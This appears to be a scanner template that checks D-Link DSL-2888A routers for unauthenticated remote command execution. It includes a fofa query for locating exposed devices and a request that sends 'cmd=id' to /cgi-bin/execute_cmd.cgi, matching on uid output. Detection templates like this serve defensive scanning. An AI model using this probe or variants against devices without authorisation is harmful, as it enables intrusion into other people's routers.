expression: r0()
id: dlink-dsl-28881a-rce
info:
  author: daffainfo
  description: "D-Link DSL\uFF0C\u96C6\u65E0\u7EBF\u3001ADSL\u3001\u8DEF\u7531\u3001\
    \u4EA4\u6362\u673A\u3001\u9632\u706B\u5899\u4E94\u5927\u529F\u80FD\uFF0CDSL\u662F\
    \u4E00\u6B3E\u5E26\u6709\u8DEF\u7531\u529F\u80FD\u7684ADSL2/2+\u7EC8\u7AEF\uFF0C\
    \u5B83\u901A\u8FC7\u4EE5\u592A\u7F51\u63A5\u53E3\u4E0E\u8BA1\u7B97\u673A\u76F8\
    \u8FDE\uFF0C\u5177\u6709\u5F3A\u5927\u7684\u8DEF\u7531\u529F\u80FD\u3002D-Link\u8DEF\
    \u7531\u5668\u7CFB\u7EDF\u5B58\u5728\u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\u6F0F\
    \u6D1E\uFF0C\u653B\u51FB\u8005\u901A\u8FC7\u6F0F\u6D1E\u53EF\u4EE5\u83B7\u53D6\
    \u670D\u52A1\u5668\u6743\u9650\u3002\nfofa-query: body=\"DSL-2888A\"\n"
  name: "D-Link DSL-28881A \u8FDC\u7A0B\u547D\u4EE4\u6267\u884C"
  reference:
  - https://mp.weixin.qq.com/s/_BX38i-IqrpsvNx4_LyH5g
  severity: critical
rules:
  r0:
    expression: response.status == 200 && "((u|g)id|groups)=[0-9]{1,4}\\([a-z0-9]+\\)".bmatches(response.body)
    request:
      method: GET
      path: /cgi-bin/execute_cmd.cgi?timestamp=test&cmd=id
